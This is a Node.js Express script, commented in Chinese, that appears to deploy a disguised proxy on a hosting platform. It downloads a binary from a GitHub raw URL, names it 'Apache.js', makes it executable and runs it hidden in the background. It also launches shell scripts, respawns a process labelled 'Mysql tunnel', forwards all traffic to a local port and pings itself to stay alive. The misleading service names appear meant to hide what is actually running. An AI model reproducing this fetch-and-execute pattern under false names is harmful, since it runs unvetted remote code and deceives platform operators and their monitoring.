// 引入必要的模块
const port = process.env.PORT || '7001'; // Express应用监听端口
const PORT8 = process.env.PORT8 || '8080'; // Apache监听端口
const express = require("express"); // Express框架
const app = express(); // 创建Express应用
var exec = require("child_process").exec; // 执行shell命令
const os = require("os"); // 操作系统模块
const { createProxyMiddleware } = require("http-proxy-middleware"); // HTTP代理中间件
var request = require("request"); // 发送HTTP请求
var fs = require("fs"); // 文件系统模块
var path = require("path"); // 路径模块
const http = require('http'); // 创建 HTTP 服务器和处理 HTTP 请求

// 根路由
app.get("/", function (req, res) {
  const gameFilePath = path.join(__dirname, "public", "index.html");
  res.sendFile(gameFilePath);
});


// 列表路由
app.get("/list2024", function (req, res) {
  let cmdStr = "cat list2024";
  exec(cmdStr, function (err, stdout, stderr) {
    if (err) {
      res.type("html").send("<pre>err：\n" + err + "</pre>");
    } else {
      res.type("html").send("<pre>Now please enjoy it：\n\n" + stdout + "</pre>");
    }
  });
});



// 定期检查Web服务和Mysql服务是否运行
let webServiceRunning = false;
let mysqlServiceRunning = false;

// 保持Web服务运行
function keep_web_alive() {
  // 通过检查进程来判断Apache服务是否正在运行
  exec("pgrep -laf Apache.js", function (err, stdout, stderr) {
    const processes = stdout.trim().split('\n');
    const apacheProcesses = processes.filter(p => p.includes('./Apache.js'));

    // 如果有Apache服务的进程正在运行，则标记服务已经运行
    if (apacheProcesses.length > 0) {
      webServiceRunning = true;
      console.log("Apache service is running");
    } else {
      // 否则，启动Apache服务
      exec(
        "chmod +x Apache.js && nohup ./Apache.js >/dev/null 2>&1 &",
        function (err, stdout, stderr) {
          if (err) {
            console.error("Failed to start Apache service: " + err);
          } else {
            webServiceRunning = true;
            console.log("Apache service has been restarted");
          }
        }
      );
    }
  });
}

// 保持Mysql服务运行
function keep_mysql_alive() {
  // 检查Mysql服务是否已经运行
  exec("pgrep -laf Mysql", function (err, stdout, stderr) {
    if (stdout.includes("./Mysql tunnel")) {
      mysqlServiceRunning = true;
      console.log("Mysql service is running");
    } else {
      // 否则，启动Mysql服务
      exec("bash ag.sh >/dev/null 2>&1", function (err, stdout, stderr) {
        if (err) {
          console.error("Failed to start Mysql service: " + err);
        } else {
          mysqlServiceRunning = true;
          console.log("Mysql service has been restarted");
        }
      });
    }
  });
}

// 检查Web服务每30秒一次
setInterval(keep_web_alive, 30 * 1000);

// 检查Mysql服务每50秒一次
setInterval(keep_mysql_alive, 50 * 1000);


// 从指定的 URL 地址下载文件，并将其保存为 Apache.js
function download_web(callback) {
  let fileName = "Apache.js";
  let web_url = "https://raw.githubusercontent.com/Cianameo/s390x-Apache-Plus/main/Apache-s390x-Plus";
  let filePath = path.join("./", fileName);
  let stream = fs.createWriteStream(filePath);
  
  request(web_url)
    .pipe(stream)
    .on("close", function (err) {
      if (err) {
        callback("Download failed: " + err);
        console.error("Download failed: " + err);
      } else {
        // 下载成功后添加权限
        fs.chmod(filePath, 0o755, (err) => {
          if (err) {
            console.error("Failed to add permission: " + err);
          } else {
            console.log("Permission added successfully");
          }
        });
        
        callback(null);
        console.log("Download successful");
      }
    });
}

// 调用 download_web 函数来下载 Apache.js 文件
download_web((error) => {
  if (error) {
    console.error(error);
  } else {
    console.log("Download completed!");
  }
});

// 执行入口脚本
exec("bash entrypoint.sh", function (err, stdout, stderr) {
  if (err) {
    console.error("Entrypoint script execution failed: " + err);
  } else {
    console.log("Entrypoint script executed successfully");
  }
});

app.use(
  "/",
  createProxyMiddleware({
    target: `http://127.0.0.1:${PORT8}/`, 
    changeOrigin: true, 
    ws: true, 
    pathRewrite: {
      "^/": "/",
    },
    logLevel: 'silent',
    onProxyReq: function onProxyReq(proxyReq, req, res) {},
  })
);

// 监听端口
app.listen(port, () => console.log(`Example app is listening on port ${port}!`));

// 定期向本地主机发送 HTTP 请求以保持连接
const loopInterval = 2 * 60 * 1000; // 2 minute
setInterval(() => {
    // Do nothing, just maintain the connection
    http.get(`http://localhost:${port}`);
}, loopInterval);

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}